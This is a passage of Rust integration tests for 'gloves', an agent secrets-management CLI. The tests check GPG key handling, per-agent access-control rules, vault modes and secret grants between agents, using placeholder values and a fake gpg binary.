    let root = temp_dir.path().join("secrets");
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary(&fake_bin);

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--agent",
            "agent-main",
            "gpg",
            "fingerprint",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("no GPG key found for agent `agent-main`"));
    assert!(stderr.contains("gloves --agent agent-main gpg create"));
}

#[cfg(unix)]
#[test]
fn cli_gpg_fingerprint_returns_existing_key() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary(&fake_bin);

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--agent",
            "agent-main",
            "gpg",
            "fingerprint",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["fingerprint"], TEST_GPG_FINGERPRINT);
}

#[cfg(unix)]
#[test]
fn cli_gpg_create_supports_long_roots_via_short_homedir_alias() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir
        .path()
        .join(format!("long-root-{}", "x".repeat(160)))
        .join("secrets");
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary_with_homedir_limit(&fake_bin, Some(90));

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["fingerprint"], TEST_GPG_FINGERPRINT);
}

#[cfg(unix)]
#[test]
fn cli_gpg_create_with_relative_root_writes_to_workspace_home() {
    let temp_dir = tempfile::tempdir().unwrap();
    let workspace = temp_dir.path().join("workspace");
    fs::create_dir_all(&workspace).unwrap();
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary(&fake_bin);

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .current_dir(&workspace)
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            ".openclaw/secrets",
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success();

    assert!(workspace
        .join(".openclaw/secrets/gpg/agent-main/fingerprint.txt")
        .exists());
}

#[test]
fn cli_secret_acl_blocks_non_matching_set() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.agent-main]\npaths = [\"github/*\"]\noperations = [\"write\"]\n",
            root.display()
        ),
    );

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "rustical/token",
            "--value",
            "secret",
            "--ttl",
            "1",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("forbidden"));
    assert!(stderr.contains("gloves access paths --agent <id> --json"));
}

#[test]
fn cli_secret_acl_blocks_non_matching_get() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "rustical/token",
            "--value",
            "secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.agent-main]\npaths = [\"github/*\"]\noperations = [\"read\"]\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            "agent-main",
            "secrets",
            "get",
            "rustical/token",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_cannot_be_bypassed_with_no_config_for_same_root() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "rustical/token",
            "--value",
            "secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.agent-main]\npaths = [\"github/*\"]\noperations = [\"read\"]\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-main",
            "secrets",
            "get",
            "rustical/token",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_filters_list_results() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "github/token",
            "--value",
            "gh",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "rustical/token",
            "--value",
            "rs",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.agent-main]\npaths = [\"github/*\"]\noperations = [\"list\", \"write\"]\n",
            root.display()
        ),
    );

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            "agent-main",
            "list",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let output_text = String::from_utf8(output).unwrap();
    assert!(output_text.contains("github/token"));
    assert!(!output_text.contains("rustical/token"));
}

#[test]
fn cli_secret_acl_uses_agent_override_policy() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--no-config",
            "--agent",
            "agent-relationships",
            "secrets",
            "set",
            "contacts/token",
            "--value",
            "contacts-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.agent-main]\npaths = [\"github/*\"]\noperations = [\"read\"]\n[secrets.acl.agent-relationships]\npaths = [\"contacts/*\"]\noperations = [\"read\", \"write\"]\n",
            root.display()
        ),
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            "agent-main",
            "secrets",
            "get",
            "contacts/token",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            "agent-relationships",
            "secrets",
            "get",
            "contacts/token",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("contacts-secret"));
}

#[test]
fn cli_secret_acl_blocks_list_without_list_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["read"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "list",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_request_without_request_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["read"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_request_for_non_matching_path() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["contacts/*"],
        &["request"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_status_for_non_matching_path() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["contacts/*"],
        &["status"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "secrets",
            "status",
            ACL_TEST_SECRET_GITHUB_TOKEN,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_revoke_without_revoke_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["read", "write"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "secrets",
            "revoke",
            ACL_TEST_SECRET_GITHUB_TOKEN,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_approve_without_approve_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let root_str = root.to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root_str,
            "--no-config",
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .success();
    let request_id = first_pending_request_id(&root);
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["deny"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "approve",
            &request_id,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_blocks_deny_without_deny_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let root_str = root.to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root_str,
            "--no-config",
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .success();
    let request_id = first_pending_request_id(&root);
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["approve"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "deny",
            &request_id,
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("forbidden"));
}

#[test]
fn cli_secret_acl_allows_approve_with_exact_path_and_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let root_str = root.to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root_str,
            "--no-config",
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .success();
    let request_id = first_pending_request_id(&root);
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &[ACL_TEST_SECRET_GITHUB_TOKEN],
        &["approve"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "approve",
            &request_id,
        ])
        .assert()
        .success();
}

#[test]
fn cli_secret_acl_allows_deny_with_matching_path_and_operation() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let config_path = temp_dir.path().join(".gloves.toml");
    let root_str = root.to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root_str,
            "--no-config",
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "request",
            ACL_TEST_SECRET_GITHUB_TOKEN,
            "--reason",
            ACL_TEST_REASON,
        ])
        .assert()
        .success();
    let request_id = first_pending_request_id(&root);
    write_secret_acl_config(
        &config_path,
        &root,
        ACL_TEST_AGENT_MAIN,
        &["github/*"],
        &["deny"],
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--agent",
            ACL_TEST_AGENT_MAIN,
            "deny",
            &request_id,
        ])
        .assert()
        .success();
}

#[test]
fn cli_vault_mode_disabled_blocks_vault_commands() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--vault-mode",
            "disabled",
            "vault",
            "list",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("disabled"));
}

#[test]
fn cli_vault_mode_required_fails_without_binaries() {
    let temp_dir = tempfile::tempdir().unwrap();
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--vault-mode",
            "required",
            "vault",
            "list",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("gocryptfs"));
}

#[test]
fn cli_vault_mode_auto_allows_non_crypto_commands_without_runtime_bins() {
    let temp_dir = tempfile::tempdir().unwrap();
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--vault-mode",
            "auto",
            "list",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("["));
}

#[test]
fn cli_vault_mode_auto_reports_missing_binary_actionably() {
    let temp_dir = tempfile::tempdir().unwrap();
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--vault-mode",
            "auto",
            "vault",
            "init",
            "agent_data",
            "--owner",
            "agent",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "required binary not found: gocryptfs",
        ));
}

#[cfg(unix)]
#[test]
fn cli_set_and_get_succeed_without_runtime_rage_binaries() {
    let temp_dir = tempfile::tempdir().unwrap();
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();
    write_executable(
        &empty_path.join(TEST_PIPE_COMMAND),
        r#"#!/bin/sh
/bin/cat
"#,
    );
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("placeholder-secret"));
}

#[test]
fn cli_extpass_get_requires_env() {
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["extpass-get", "vault/agent_data"])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "missing required environment variable: GLOVES_EXTPASS_ROOT",
        ));
}

#[test]
fn cli_extpass_get_reads_raw_secret_bytes() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();
    let expected = vec![0xff, 0x10, 0x61, 0x80];

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "vault/agent_data",
            "--stdin",
            "--ttl",
            "1",
        ])
        .write_stdin(expected.clone())
        .assert()
        .success();

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("GLOVES_EXTPASS_ROOT", root)
        .env("GLOVES_EXTPASS_AGENT", "default-agent")
        .args(["extpass-get", "vault/agent_data"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(output, expected);
}

#[test]
fn cli_set_generate() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--generate",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    assert!(temp_dir.path().join("store/x.age").exists());
}

#[test]
fn cli_set_duplicate_secret_fails() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--generate",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "secrets",
            "set",
            "x",
            "--generate",
            "--ttl",
            "1",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_set_then_get_roundtrip() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("placeholder-secret"));
}

#[test]
fn cli_grant_allows_granted_agent_to_get_secret() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "--agent",
            "agent-b",
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .failure();

    let grant_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "grant",
            "x",
            "--to",
            "agent-b",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let grant_payload: serde_json::Value = serde_json::from_slice(&grant_output).unwrap();
    assert_eq!(grant_payload["action"], "granted");
    assert_eq!(grant_payload["secret_name"], "x");
    assert_eq!(grant_payload["granted_to"], "agent-b");
    assert_eq!(grant_payload["granted_by"], "agent-main");
    assert_eq!(grant_payload["changed"], true);

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
        .args([
            "--root",
            root,
            "--agent",
            "agent-b",
            "secrets",
            "get",
            "x",
            "--pipe-to",
            TEST_PIPE_COMMAND,
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("placeholder-secret"));

    let metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("meta/x.json")).unwrap())
            .unwrap();
    let recipients = metadata["recipients"].as_array().unwrap();
    assert!(recipients.iter().any(|value| value == "agent-main"));
    assert!(recipients.iter().any(|value| value == "agent-b"));
}

#[test]
fn cli_grant_requires_secret_creator_identity() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root", root, "--agent", "agent-b", "secrets", "grant", "x", "--to", "agent-c",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("can only be granted by its creator"));
    assert!(stderr.contains("agent-main"));
}

#[test]
fn cli_grant_is_idempotent_for_existing_recipient() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().to_str().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "set",
            "x",
            "--value",
            "placeholder-secret",
            "--ttl",
            "1",
        ])
        .assert()
        .success();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "grant",
            "x",
            "--to",
            "agent-b",
        ])
        .assert()
        .success();

    let grant_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            root,
            "--agent",
            "agent-main",
            "secrets",
            "grant",
            "x",
            "--to",
            "agent-b",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let grant_payload: serde_json::Value = serde_json::from_slice(&grant_output).unwrap();
    assert_eq!(grant_payload["action"], "already_granted");
    assert_eq!(grant_payload["changed"], false);
    assert_eq!(grant_payload["secret_name"], "x");
    assert_eq!(grant_payload["granted_to"], "agent-b");

    let metadata: serde_json::Value =
        serde_json::from_slice(&std::fs::read(temp_dir.path().join("meta/x.json")).unwrap())
            .unwrap();
    let recipients = metadata["recipients"].as_array().unwrap();
    assert_eq!(recipients.len(), 2);
    assert!(recipients.iter().any(|value| value == "agent-main"));
    assert!(recipients.iter().any(|value| value == "agent-b"));
}

#[test]
fn cli_grant_matrix_is_stable_across_ten_fresh_passes() {
    for pass in 0..GRANT_MATRIX_PASS_COUNT {
        let temp_dir = tempfile::tempdir().unwrap();
        let root = temp_dir.path().to_str().unwrap();
        let secret_name = format!("matrix-secret-{pass}");
        let secret_value = format!("placeholder-secret-{pass}");

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .args([
                "--root",
                root,
                "--agent",
                "agent-main",
                "secrets",
                "set",
                &secret_name,
                "--value",
                &secret_value,
                "--ttl",
                "1",
            ])
            .assert()
            .success();

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
            .args([
                "--root",
                root,
                "--agent",
                "agent-main",
                "secrets",
                "get",
                &secret_name,
                "--pipe-to",
                TEST_PIPE_COMMAND,
            ])
            .assert()
            .success()
            .stdout(predicates::str::contains(&secret_value));

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
            .args([
                "--root",
                root,
                "--agent",
                "agent-b",
                "secrets",
                "get",
                &secret_name,
                "--pipe-to",
                TEST_PIPE_COMMAND,
            ])
            .assert()
            .failure();

        let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .args([
                "--root",
                root,
                "--agent",
                "agent-b",
                "secrets",
                "grant",
                &secret_name,
                "--to",
                "agent-c",
            ])
            .assert()
            .failure();
        let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
        assert!(stderr.contains("can only be granted by its creator"));
        assert!(stderr.contains("agent-main"));

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .args([
                "--root",
                root,
                "--agent",
                "agent-main",
                "secrets",
                "grant",
                &secret_name,
                "--to",
                "agent-b",
            ])
            .assert()
            .success();

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
            .args([
                "--root",
                root,
                "--agent",
                "agent-b",
                "secrets",
                "get",
                &secret_name,
                "--pipe-to",
                TEST_PIPE_COMMAND,
            ])
            .assert()
            .success()
            .stdout(predicates::str::contains(&secret_value));

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .args([
                "--root",
                root,
                "--agent",
                "agent-main",
                "secrets",
                "grant",
                &secret_name,
                "--to",
                "agent-c",
            ])
            .assert()
            .success();

        Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
            .env(GET_PIPE_ALLOWLIST_ENV_VAR, TEST_PIPE_COMMAND)
            .args([
                "--root",
                root,
                "--agent",
                "agent-c",
                "secrets",
                "get",
                &secret_name,
                "--pipe-to",
                TEST_PIPE_COMMAND,
            ])
            .assert()
            .success()
            .stdout(predicates::str::contains(&secret_value));

        assert!(temp_dir.path().join("agent-main.agekey").exists());
        assert!(temp_dir.path().join("agent-b.agekey").exists());
        assert!(temp_dir.path().join("agent-c.agekey").exists());
        assert!(!temp_dir.path().join("default-agent.agekey").exists());

        let metadata_path = temp_dir.path().join(format!("meta/{secret_name}.json"));
        let metadata: serde_json::Value =
            serde_json::from_slice(&std::fs::read(metadata_path).unwrap()).unwrap();
        let recipients = metadata["recipients"].as_array().unwrap();
        assert_eq!(recipients.len(), 3);
        assert!(recipients.iter().any(|value| value == "agent-main"));
        assert!(recipients.iter().any(|value| value == "agent-b"));
        assert!(recipients.iter().any(|value| value == "agent-c"));
        assert!(recipients.iter().all(|value| value != "default-agent"));
    }
}

#[test]
fn cli_get_missing_secret_suggests_recovery() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "secrets",
            "get",
            "missing",
        ])
        .assert()
        .failure();
